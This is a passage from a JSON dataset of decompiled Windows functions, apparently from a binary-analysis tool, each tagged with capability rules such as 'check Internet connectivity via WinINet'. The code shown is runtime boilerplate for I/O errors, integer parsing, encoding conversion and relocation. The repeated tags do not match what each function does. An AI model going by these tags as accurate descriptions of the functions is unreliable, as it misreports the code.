        "decompiled_code": "\nvoid fcn.140006d27(int64_t *arg1, int64_t **arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    ulong uVar5;\n    ulong *arg1_00;\n    ulong noname_1;\n    ulong in_R9;\n    ulong *unaff_R12;\n    ulong *arg1_01;\n    ulong var_18h;\n    ulong *var_138h;\n    ulong *var_130h;\n    int64_t var_128h;\n    ulong var_120h;\n    \n    var_138h = NULL;\n    cVar1 = fcn.140006315(&var_138h, arg1);\n    if (cVar1 == '\\0') {\n        unaff_R12 = fcn.140006146(0x1400eb2a0, 0x30);\n        arg1_00 = 0xd;\n        *unaff_R12 = 0x1400eb260;\n        unaff_R12[2] = \"IOError\";\n        if (arg1 != NULL) {\n            arg1_00 = *arg1 + 0xd;\n        }\n        goto code_r0x000140006e8e;\n    }\n    var_130h = *0x1400eb250;\n    *0x1400eb250 = &var_130h;\n    iVar2 = sub.msvcrt.dll__setjmp(&var_120h, &stack0xfffffffffffffff8);\n    arg1_01 = var_138h;\n    var_128h = iVar2;\n    if (var_128h == 0) {\n        arg1 = NULL;\n        noname_1 = 0x14001c0fd;\n        uVar5 = fcn.140001541(arg2);\n        iVar2 = fcn.140004bae(arg1_01, noname_1, uVar5, in_R9);\n        while( true ) {\n            while( true ) {\n                piVar4 = arg1;\n                if (arg2 != NULL) {\n                    piVar4 = *arg2;\n                }\n                unaff_R12 = arg1_01;\n                if (piVar4 <= iVar2) goto code_r0x000140006e23;\n                if (*(arg2 + iVar2 + 0x10) != '\\0') break;\n                iVar3 = sub.msvcrt.dll_fputc(0, arg1_01);\n                if (iVar3 != 0) goto code_r0x000140006e6e;\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = fcn.140004bae(arg1_01, 0x14001c0fd, arg2 + iVar2 + 0x10, in_R9);\n            if (iVar3 < 1) break;\n            iVar2 = iVar2 + iVar3;\n        }\ncode_r0x000140006e6e:\n        arg1_00 = 0x1400d6620;\n        fcn.140006ba1(0x1400d6620);\ncode_r0x000140006e7a:\n        sub.msvcrt.dll_fclose();\n        unaff_R12 = arg1_01;\n    }\n    else {\ncode_r0x000140006e23:\n        fcn.140001558();\n        arg1_00 = var_138h;\n        arg1_01 = unaff_R12;\n        if (var_138h != NULL) goto code_r0x000140006e7a;\n    }\n    if (var_128h == 0) {\n        return;\n    }\n    fcn.140006cf1();\ncode_r0x000140006e8e:\n    uVar5 = fcn.14000637b(arg1_00);\n    fcn.140001f14(uVar5, 0x1400d6660);\n    fcn.140001f3a(uVar5, arg1);\n    fcn.140004e55(unaff_R12 + 3, uVar5);\n    fcn.140004e55(unaff_R12 + 1, 0);\n    fcn.140006a95(unaff_R12, \"IOError\");\n    return;\n}\n",
        "token_count": 931
    },
    "140006ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140006eff(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong *arg1_00;\n    int32_t *piVar4;\n    int64_t *arg2_00;\n    uint *puVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    ulong *puVar8;\n    ulong ptr;\n    ulong nitems;\n    ulong *stream;\n    ulong *var_130h;\n    ulong *var_128h;\n    ulong var_120h;\n    \n    stream = NULL;\n    cVar2 = fcn.140006315(&stream, arg1);\n    if (cVar2 == '\\0') {\n        arg1_00 = fcn.140006146(0x1400eb2a0, 0x30);\n        puVar8 = 0xd;\n        *arg1_00 = 0x1400eb260;\n        arg1_00[2] = \"IOError\";\n        if (arg1 != NULL) {\n            puVar8 = *arg1 + 0xd;\n        }\n        goto code_r0x0001400070ae;\n    }\n    var_130h = *0x1400eb250;\n    *0x1400eb250 = &var_130h;\n    iVar3 = sub.msvcrt.dll__setjmp(&var_120h, &stack0xfffffffffffffff8);\n    puVar8 = stream;\n    arg1_00 = iVar3;\n    var_128h = arg1_00;\n    if (arg1_00 == NULL) {\n        sub.msvcrt.dll_fwrite(arg2, 1, arg3, stream);\n        iVar3 = sub.msvcrt.dll_ferror(puVar8);\n        pcVar1 = _sym.imp.msvcrt.dll__errno;\n        if (iVar3 == 0) goto code_r0x000140006fe3;\n        piVar4 = (*_sym.imp.msvcrt.dll__errno)();\n        arg2_00 = fcn.140006561(*piVar4);\n        puVar5 = (*pcVar1)();\n        uVar7 = sub.msvcrt.dll_strerror(*puVar5);\n        arg1 = fcn.140005f79(uVar7);\n        iVar6 = 0;\n        if (arg2_00 != NULL) {\n            iVar6 = *arg2_00;\n        }\n        if (arg1 != NULL) {\n            arg1_00 = *arg1;\n        }\n        arg1_00 = fcn.14000637b(arg1_00 + iVar6 + 10);\n        fcn.140001f14(arg1_00, 0x1400d6600);\n        fcn.140001f3a(arg1_00, arg2_00);\n        fcn.140001f14(arg1_00, 0x1400d65e0);\n        fcn.140001f3a(arg1_00, arg1);\n        fcn.140001f14(arg1_00, 0x1400d65c0);\n        sub.msvcrt.dll_clearerr(puVar8);\n        puVar8 = arg1_00;\n        fcn.140006ba1(arg1_00);\ncode_r0x00014000709a:\n        sub.msvcrt.dll_fclose();\n    }\n    else {\ncode_r0x000140006fe3:\n        fcn.140001558();\n        puVar8 = stream;\n        if (stream != NULL) goto code_r0x00014000709a;\n    }\n    if (var_128h == NULL) {\n        return;\n    }\n    fcn.140006cf1();\ncode_r0x0001400070ae:\n    uVar7 = fcn.14000637b(puVar8);\n    fcn.140001f14(uVar7, 0x1400d6660);\n    fcn.140001f3a(uVar7, arg1);\n    fcn.140004e55(arg1_00 + 3, uVar7);\n    fcn.140004e55(arg1_00 + 1, 0);\n    fcn.140006a95(arg1_00, \"IOError\");\n    return;\n}\n",
        "token_count": 940
    },
    "1400075c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400075c9(int64_t *arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint8_t uVar10;\n    int64_t iVar11;\n    uint8_t uVar12;\n    int64_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    uint64_t auStack56 [2];\n    \n    iVar4 = *arg1;\n    if (0 < iVar4) {\n        if (*(arg1 + 2) == '+') {\n            iVar11 = -1;\ncode_r0x0001400075f9:\n            iVar5 = 1;\n            if (iVar4 == 1) goto code_r0x000140007693;\n        }\n        else {\n            iVar11 = 1;\n            if (*(arg1 + 2) == '-') goto code_r0x0001400075f9;\n            iVar11 = -1;\n            iVar5 = 0;\n        }\n        if (*(arg1 + iVar5 + 0x10) - 0x30U < 10) {\n            iVar7 = 0;\n            iVar13 = 10;\ncode_r0x00014000762c:\n            uVar10 = *(arg1 + iVar5 + 0x10);\n            uVar8 = uVar10;\n            if (uVar10 - 0x30 < 10) {\n                if ((uVar8 + 0x7fffffffffffffd0) / iVar13 <= iVar7) goto code_r0x000140007655;\n                goto code_r0x000140007650;\n            }\n            while ((iVar11 == -1 && (iVar7 == -0x8000000000000000))) {\ncode_r0x000140007650:\n                fcn.140007540();\ncode_r0x000140007655:\n                uVar8 = uVar8 - 0x30;\n                iVar7 = iVar7 * 10 - uVar8;\n                iVar6 = iVar5;\n                while (iVar5 = iVar6 + 1,  iVar5 < iVar4) {\n                    iVar2 = iVar6 + 0x11;\n                    iVar6 = iVar5;\n                    if (*(arg1 + iVar2) != '_') goto code_r0x00014000762c;\n                }\n            }\n            uVar8 = iVar7 * iVar11;\n            if (iVar5 == 0) {\n                uVar8 = 0xffffffffffffffff;\n            }\n            goto code_r0x000140007697;\n        }\n    }\ncode_r0x000140007693:\n    uVar8 = 0xffffffffffffffff;\ncode_r0x000140007697:\n    puVar9 = 0x1400d5760;\n    while( true ) {\n        fcn.140002078(auStack56, 0x10);\n        auStack56[0] = *puVar9;\n        piVar3 = fcn.140006100(puVar9[1]);\n        if (auStack56[0] == uVar8) break;\n        iVar11 = 0;\n        iVar4 = 0;\n        while (piVar3 != NULL) {\n            iVar5 = *piVar3;\n            if (iVar5 <= iVar4) goto code_r0x0001400076f7;\n            iVar7 = *arg1;\n            if (iVar7 <= iVar11) goto code_r0x00014000776b;\n            cVar1 = *(piVar3 + iVar4 + 0x10);\n            if ((cVar1 == '-') || (cVar1 == '_')) {\n                iVar4 = iVar4 + 1;\n            }\n            cVar1 = *(arg1 + iVar11 + 0x10);\n            if ((cVar1 == '-') || (cVar1 == '_')) {\n                iVar11 = iVar11 + 1;\n                if (iVar4 < iVar5) {\n                    bVar15 = SBORROW8(iVar7, iVar11);\n                    iVar5 = iVar7 - iVar11;\n                    bVar14 = iVar7 == iVar11;\n                    goto code_r0x00014000772e;\n                }\n            }\n            else {\n                bVar15 = SBORROW8(iVar5, iVar4);\n                iVar5 = iVar5 - iVar4;\n                bVar14 = iVar5 == 0;\ncode_r0x00014000772e:\n                if (!bVar14 && bVar15 == iVar5 < 0) {\n                    uVar10 = *(piVar3 + iVar4 + 0x10);\n                    if (uVar10 + 0xbf < 0x1a) {\n                        uVar10 = uVar10 ^ 0x20;\n                    }\n                    uVar12 = *(arg1 + iVar11 + 0x10);\n                    if (uVar12 + 0xbf < 0x1a) {\n                        uVar12 = uVar12 ^ 0x20;\n                    }\n                    if (uVar12 != uVar10) goto code_r0x00014000776b;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar11 = iVar11 + 1;\n        }\n        iVar5 = 0;\ncode_r0x0001400076f7:\n        if ((iVar5 == iVar4) && (iVar11 == *arg1)) break;\ncode_r0x00014000776b:\n        puVar9 = puVar9 + 2;\n        if (puVar9 == 0x1400d6190) {\n            return 0xffffffff;\n        }\n    }\n    return auStack56[0] & 0xffffffff;\n}\n",
        "token_count": 1285
    },
    "14000779": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.140007792(ulong arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int64_t *arg1_00;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint64_t arg2;\n    int64_t iVar9;\n    int64_t aiStack64 [2];\n    \n    uVar6 = 0;\n    puVar5 = fcn.140006146(0x1400dc080, 0x38);\n    *puVar5 = 0x1400dc100;\n    puVar5[2] = \"OSError\";\n    *(puVar5 + 6) = arg1;\n    if (arg1 != 0) {\n        aiStack64[0] = 0;\n        uVar6 = 0;\n        iVar4 = (**0x1400dc7d0)(0x1300, 0, arg1, 0, aiStack64, 0, 0);\n        iVar3 = aiStack64[0];\n        if (iVar4 != 0) {\n            uVar6 = fcn.14000637b(100);\n            iVar7 = 0;\n            while( true ) {\n                uVar1 = *(iVar3 + iVar7 * 2);\n                arg2 = uVar1;\n                if (uVar1 == 0) break;\n                iVar9 = iVar7 + 1;\n                if (uVar1 + 0x2800 < 0x400) {\n                    uVar2 = *(iVar3 + 2 + iVar7 * 2);\n                    if (0x3ff < uVar2 + 0x2400) {\ncode_r0x000140007940:\n                        arg2 = 0xfffd;\n                        goto code_r0x000140007945;\n                    }\n                    iVar9 = iVar7 + 2;\n                    arg2 = ((uVar1 & 0x3ff) << 10 | uVar2 & 0x3ff) + 0x10000;\n                    uVar6 = fcn.14000603c(uVar6, arg2 >> 0x12 | 0xf0);\n                    uVar6 = fcn.14000603c(uVar6, arg2 >> 0xc & 0x3f | 0x80);\n                    uVar8 = arg2 >> 6 & 0x3f | 0x80;\ncode_r0x00014000791f:\n                    uVar6 = fcn.14000603c(uVar6, uVar8);\n                    arg2 = arg2 & 0x3f | 0x80;\n                    iVar7 = iVar9;\n                }\n                else {\n                    if (uVar1 + 0x2400 < 0x400) goto code_r0x000140007940;\n                    iVar7 = iVar9;\n                    if (uVar1 < 0x80) goto code_r0x000140007930;\n                    if (arg2 < 0x800) {\n                        uVar8 = arg2 >> 6 | 0xc0;\n                        goto code_r0x00014000791f;\n                    }\ncode_r0x000140007945:\n                    uVar6 = fcn.14000603c(uVar6, arg2 >> 0xc | 0xe0);\n                    uVar6 = fcn.14000603c(uVar6, arg2 >> 6 & 0x3f | 0x80);\n                    arg2 = arg2 & 0x3f | 0x80;\n                    iVar7 = iVar9;\n                }\ncode_r0x000140007930:\n                uVar6 = fcn.14000603c(uVar6, arg2);\n            }\n            if (aiStack64[0] != 0) {\n                (**0x1400dc7c8)();\n            }\n        }\n    }\n    fcn.140004e55(puVar5 + 3, uVar6);\n    arg1_00 = puVar5[3];\n    if ((arg1_00 == NULL) || (*arg1_00 == 0)) {\n        uVar6 = fcn.140005dc7(0x14001d7a0);\n        puVar5[3] = uVar6;\n        if (arg1_00 != NULL) {\n            fcn.140004e35(arg1_00);\n        }\n    }\n    return puVar5;\n}\n",
        "token_count": 996
    },
    "1400079f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.1400079fe(int64_t **arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong *arg1_00;\n    int64_t *piVar4;\n    char *arg1_01;\n    int64_t **arg1_02;\n    ulong uVar5;\n    int64_t iVar6;\n    int64_t **ppiVar7;\n    ulong uVar8;\n    int64_t arg1_03;\n    ulong in_R8;\n    ulong in_R9;\n    ulong var_10h;\n    ulong var_174h;\n    int64_t *var_168h;\n    ulong var_160h;\n    uint var_158h;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    ulong var_148h;\n    ulong *var_140h;\n    int64_t *var_138h;\n    ulong var_130h;\n    \n    uVar8 = 8;\n    var_168h = NULL;\n    fcn.140002078(&var_160h, 8);\n    var_160h._0_4_ = fcn.1400075c9(0x14001db40, uVar8, in_R8, in_R9);\n    uVar1 = fcn.1400075c9(0x14001db20, uVar8, in_R8, in_R9);\n    uVar3 = var_160h;\n    var_160h._4_4_ = uVar1;\n    if (var_160h == 0xffffffff) {\n        arg1_00 = fcn.140006146(0x1400dcb40, 0x30);\n        *arg1_00 = 0x1400dcbc0;\n        arg1_00[2] = \"EncodingError\";\n        uVar8 = fcn.14000637b(0x1b);\n        fcn.140001f14(uVar8, 0x14001d880);\n        fcn.140001f14(uVar8, 0x14001db40);\n        fcn.140004e55(arg1_00 + 3, uVar8);\n        fcn.140004e55(arg1_00 + 1, 0);\n    }\n    else {\n        if (uVar1 != 0xffffffff) {\n            var_140h = *0x1400eb250;\n            *0x1400eb250 = &var_140h;\n            iVar2 = sub.msvcrt.dll__setjmp(&var_130h, &stack0xfffffffffffffff8);\n            arg1_01 = iVar2;\n            var_138h = arg1_01;\n            if (arg1_01 == NULL) {\n                while ((arg1 != NULL && (*arg1 != NULL))) {\n                    fcn.140002078(&var_158h, 0x18);\n                    var_148h = *0x14001d870;\n                    var_158h = *0x14001d860;\n                    uStack348 = *0x14001d864;\n                    uStack344 = *0x14001d868;\n                    uStack340 = *0x14001d86c;\n                    if ((uVar1 - 12000 < 2) || (uVar1 == 0x4b1)) {\n                        piVar4 = fcn.140006585(uVar1);\n                        iVar6 = 0x2a;\n                        if (piVar4 != NULL) {\n                            iVar6 = *piVar4 + 0x2a;\n                        }\n                        arg1_01 = fcn.14000637b(iVar6);\n                        fcn.140001f14(arg1_01, 0x14001d840);\n                        fcn.140001f3a(arg1_01, piVar4);\n                        fcn.140001f14(arg1_01, 0x14001d800);\n                        arg1_00 = fcn.140006146(0x1400dcb40, 0x30);\n                        *arg1_00 = 0x1400dcbc0;\n                        iVar6 = arg1_00[3];\n                        arg1_00[2] = \"EncodingError\";\n                        uVar8 = fcn.140005dc7(arg1_01);\n                        arg1_00[3] = uVar8;\n                        if (iVar6 != 0) {\n                            fcn.140004e35(iVar6);\n                        }\n                        fcn.140004e55(arg1_00 + 1, 0);\n                    }\n                    else {\n                        if ((1 < uVar3 - 12000) && (uVar3 != 0x4b1)) {\n                            if (uVar1 == 0x4b0) {\ncode_r0x000140008037:\n                                if (uVar3 == 0x4b0) {\ncode_r0x000140008047:\n                                    var_168h = fcn.140006100(arg1);\n                                    goto code_r0x00014000805e;\n                                }\ncode_r0x000140007f03:\n                                arg1_01 = *arg1;\n                                piVar4 = arg1_01 >> 2;\ncode_r0x000140007f1f:\n                                arg1_03 = arg1_01 + piVar4;\n                                arg1_01 = fcn.14000637b(arg1_03);\n                                *arg1_01 = arg1_03;\n                                fcn.140001541(arg1_01);\n                                uVar8 = fcn.140001541(arg1);\n                                iVar2 = (**0x1400dcb20)(uVar3, 0, uVar8);\n                                if (iVar2 == 0) {\n                                    fcn.140001541(arg1);\n                                    iVar2 = (**0x1400dcb20)(uVar3);\n                                    arg1_01 = fcn.14000637b(iVar2);\n                                    *arg1_01 = iVar2;\n                                    fcn.140001541(arg1_01);\n                                    uVar8 = fcn.140001541(arg1);\n                                    iVar2 = (**0x1400dcb20)(uVar3, 0, uVar8);\n                                    iVar6 = iVar2;\n                                    if (iVar2 == 0) goto code_r0x000140008020;\n                                }\n                                else {\n                                    iVar6 = iVar2;\n                                    var_168h = arg1_01;\n                                    if (arg1_03 < iVar6) goto code_r0x00014000805e;\n                                }\n                            }\n                            else {\n                                iVar6 = (*arg1 >> 2) + *arg1;\n                                arg1_02 = fcn.14000637b(iVar6 * 2);\n                                *arg1_02 = iVar6 * 2;\n                                uVar8 = fcn.140001541(arg1_02);\n                                ppiVar7 = arg1;\n                                uVar5 = fcn.140001541(arg1);\n                                iVar2 = (**0x1400dcb28)(uVar1, 0, uVar5, *ppiVar7, uVar8, iVar6);\n                                if (iVar2 != 0) {\n                                    arg1 = arg1_02;\n                                    if (iVar6 < iVar2) goto code_r0x000140008037;\ncode_r0x000140007ed8:\n                                    arg1 = fcn.1400063ae(arg1_02, iVar2 * 2);\n                                    if (uVar3 == 0x4b0) goto code_r0x000140008047;\n                                    piVar4 = arg1_01;\n                                    if (arg1 != NULL) goto code_r0x000140007f03;\n                                    goto code_r0x000140007f1f;\n                                }\n                                fcn.140001541(arg1);\n                                iVar2 = (**0x1400dcb28)(uVar1);\n                                arg1_02 = fcn.14000637b(iVar2 * 2);\n                                *arg1_02 = iVar2 * 2;\n                                uVar8 = fcn.140001541(arg1_02);\n                                uVar5 = fcn.140001541(arg1);\n                                iVar6 = 0;\n                                iVar2 = (**0x1400dcb28)(uVar1, 0, uVar5, *arg1, uVar8, iVar2);\n                                if (iVar2 != 0) goto code_r0x000140007ed8;\ncode_r0x000140008020:\n                                uVar3 = (**0x1400dc7c0)();\n                                fcn.1400079ce(uVar3);\n                            }\n                            var_168h = fcn.1400063ae(arg1_01, iVar6);\n                            goto code_r0x00014000805e;\n                        }\n                        piVar4 = fcn.140006585(uVar3);\n                        iVar6 = 0x28;\n                        if (piVar4 != NULL) {\n                            iVar6 = *piVar4 + 0x28;\n                        }\n                        arg1_01 = fcn.14000637b(iVar6);\n                        fcn.140001f14(arg1_01, 0x14001d7e0);\n                        fcn.140001f3a(arg1_01, piVar4);\n                        fcn.140001f14(arg1_01, 0x14001d800);\n                        arg1_00 = fcn.140006146(0x1400dcb40, 0x30);\n                        *arg1_00 = 0x1400dcbc0;\n                        iVar6 = arg1_00[3];\n                        arg1_00[2] = \"EncodingError\";\n                        uVar8 = fcn.140005dc7(arg1_01);\n                        arg1_00[3] = uVar8;\n                        if (iVar6 != 0) {\n                            fcn.140004e35(iVar6);\n                        }\n                        fcn.140004e55(arg1_00 + 1, 0);\n                    }\ncode_r0x000140007bc7:\n                    fcn.140006a95(arg1_00, \"EncodingError\");\n                }\n                var_168h = NULL;\n            }\ncode_r0x00014000805e:\n            fcn.140001558();\n            if (var_138h != NULL) {\n                fcn.140006cf1();\n            }\n            return var_168h;\n        }\n        arg1_00 = fcn.140006146(0x1400dcb40, 0x30);\n        *arg1_00 = 0x1400dcbc0;\n        arg1_00[2] = \"EncodingError\";\n        uVar8 = fcn.14000637b(0x1a);\n        fcn.140001f14(uVar8, 0x14001d880);\n        fcn.140001f14(uVar8, 0x14001db20);\n        fcn.140004e55(arg1_00 + 3, uVar8);\n        fcn.140004e55(arg1_00 + 1, 0);\n    }\n    arg1_01 = \"EncodingError\";\n    goto code_r0x000140007bc7;\n}\n",
        "token_count": 2481
    },
    "140009fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140009fa0(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code **ppcVar5;\n    \n    if (*0x1400edf00 == 0) {\n        *0x1400edf00 = 1;\n        uVar2 = **0x1400d7020;\n        if (uVar2 == 0xffffffff) {\n            uVar4 = 0;\n            do {\n                uVar2 = uVar4;\n                uVar4 = uVar2 + 1;\n            } while ((*0x1400d7020)[uVar4] != 0);\n        }\n        if (uVar2 != 0) {\n            ppcVar5 = *0x1400d7020 + uVar2;\n            ppcVar1 = *0x1400d7020 + (uVar2 - (uVar2 - 1)) + -1;\n            do {\n                (**ppcVar5)();\n                ppcVar5 = ppcVar5 + -1;\n            } while (ppcVar5 != ppcVar1);\n        }\n        iVar3 = sub.msvcrt.dll__onexit(0x140009ef0);\n        return -(iVar3 == 0);\n    }\n    return *0x1400edf00;\n}\n",
        "token_count": 307
    },
    "14000a3a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.14000a3a0(ulong param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5, ulong param_6, \n                  uint64_t param_7, ulong param_8)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    code *pcVar10;\n    uint32_t uVar11;\n    int64_t iVar12;\n    int64_t *piVar13;\n    int32_t *piVar14;\n    uint uVar15;\n    uint64_t arg2;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t *arg1;\n    int32_t iVar18;\n    ulong var_8h;\n    ulong auStack216 [5];\n    uint auStack176 [2];\n    uint64_t auStack168 [10];\n    uchar auStack88 [8];\n    ulong uStack80;\n    ulong var_4h;\n    \n    iVar18 = *0x1400edf70;\n    if (*0x1400edf70 != 0) {\n        return;\n    }\n    *0x1400edf70 = 1;\n    auStack168[5] = 0x14000a3df;\n    fcn.14000ac50();\n    auStack168[5] = 0x14000a3f6;\n    iVar12 = fcn.14000ae90(param_5);\n    iVar17 = *0x1400d7060;\n    puVar9 = *0x1400d7030;\n    *0x1400edf74 = 0;\n    iVar12 = -iVar12;\n    *0x1400edf78 = &stack0xffffffffffffffa8 + iVar12;\n    if (*0x1400d7030 - *0x1400d7040 < 8) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    puVar16 = *0x1400d7040;\n    if (*0x1400d7030 - *0x1400d7040 < 0xc) {\ncode_r0x00014000a433:\n        if (*puVar16 == 0) {\n            uVar11 = puVar16[1];\ncode_r0x00014000a440:\n            if (uVar11 == 0) {\n                arg2 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x00014000a611:\n                    uVar15 = 0x400d69a0;\n                    *(&stack0xffffffffffffff80 + iVar12) = 0x14000a61d;\n                    fcn.14000a1c0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, param_7, param_8);\n                    if (*0x1400edf80 != NULL) {\n                        *(&stack0xffffffffffffff50 + iVar12) = uVar15;\n                        *(&stack0xffffffffffffff58 + iVar12) = arg2;\n                        *(&stack0xffffffffffffff60 + iVar12) = param_3;\n                        *(&stack0xffffffffffffff68 + iVar12) = param_4;\n                        *(&stack0xffffffffffffff70 + iVar12) = *(&stack0xffffffffffffffb0 + iVar12);\n                        *(&stack0xffffffffffffff28 + iVar12) = 0x14000a65b;\n                        (**0x1400edf80)(&stack0xffffffffffffff50 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x1400d7030 <= puVar16) {\n                    *0x1400edf74 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar16 + 2);\n                        arg2 = uVar2;\n                        piVar13 = *puVar16 + iVar17;\n                        arg1 = puVar16[1] + iVar17;\n                        iVar5 = *piVar13;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1;\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x14000a5c4;\n                        fcn.14000a230(arg1);\n                        *arg1 = iVar5 + (iVar4 - piVar13);\ncode_r0x00014000a49c:\n                        puVar16 = puVar16 + 3;\n                        if (puVar9 <= puVar16) goto code_r0x00014000a508;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1;\n                            *(&stack0xffffffffffffff80 + iVar12) = 0x14000a59a;\n                            fcn.14000a230(arg1);\n                            *arg1 = iVar5 + (iVar8 - piVar13);\n                            goto code_r0x00014000a49c;\n                        }\ncode_r0x00014000a605:\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x14000a611;\n                        fcn.14000a1c0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, param_7, param_8);\n                        goto code_r0x00014000a611;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1;\n                        param_7 = uVar2 | 0xffffffffffffff00;\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x14000a499;\n                        fcn.14000a230(arg1);\n                        *arg1 = iVar5 + (uVar2 - piVar13);\n                        goto code_r0x00014000a49c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x00014000a605;\n                    uVar3 = *arg1;\n                    param_7 = uVar3 | 0xffffffffffff0000;\n                    puVar16 = puVar16 + 3;\n                    *(&stack0xffffffffffffff80 + iVar12) = 0x14000a4fa;\n                    fcn.14000a230(arg1);\n                    *arg1 = iVar5 + (uVar3 - piVar13);\n                } while (puVar16 < puVar9);\n                goto code_r0x00014000a508;\n            }\n        }\n    }\n    else if (**0x1400d7040 == 0) {\n        uVar11 = (*0x1400d7040)[1];\n        if ((uVar11 | (*0x1400d7040)[2]) == 0) {\n            puVar16 = *0x1400d7040 + 3;\n            goto code_r0x00014000a433;\n        }\n        goto code_r0x00014000a440;\n    }\n    if (*0x1400d7030 <= puVar16) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar11 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar14 = *puVar1 + iVar17;\n        iVar4 = *piVar14;\n        *(&stack0xffffffffffffff80 + iVar12) = 0x14000a5f8;\n        fcn.14000a230(piVar14);\n        *piVar14 = uVar11 + iVar4;\n    } while (puVar16 < puVar9);\ncode_r0x00014000a508:\n    pcVar10 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1400edf74) {\n        iVar17 = 0;\n        do {\n            piVar14 = *0x1400edf78 + iVar17;\n            iVar4 = *piVar14;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar14 + 4);\n                uVar7 = *(piVar14 + 2);\n                *(&stack0xffffffffffffff80 + iVar12) = 0x14000a547;\n                (*pcVar10)(uVar7, uVar6, iVar4, &stack0xffffffffffffffb4);\n            }\n            iVar18 = iVar18 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar18 < *0x1400edf74);\n    }\n    return;\n}\n",
        "token_count": 1948
    },
    "14000a9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
